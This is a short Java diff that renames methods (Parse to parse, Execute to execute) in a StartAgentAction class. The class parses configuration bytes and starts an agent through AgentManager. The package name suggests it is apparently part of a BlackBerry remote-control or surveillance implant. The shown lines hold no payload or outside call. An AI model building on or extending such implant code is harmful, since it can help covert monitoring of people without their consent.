@@ -16,19 +16,19 @@ import com.ht.rcs.blackberry.AgentManager;
 public class StartAgentAction extends SubAction {
     private int agentId;
 
-    public StartAgentAction(int actionId, byte[] confParams) {
-        super(actionId);
-        Parse(confParams);
+    public StartAgentAction(int actionId_, byte[] confParams) {
+        super(actionId_);
+        parse(confParams);
     }
 
-    public boolean Execute() {
+    public boolean execute() {
         debug.info("Starting " + agentId);
         AgentManager agentManager = AgentManager.getInstance();
 
         return agentManager.start(agentId);
     }
 
-    protected boolean Parse(byte[] confParams) {
+    protected boolean parse(byte[] confParams) {
         DataBuffer databuffer = new DataBuffer(confParams, 0,
                 confParams.length, false);
 
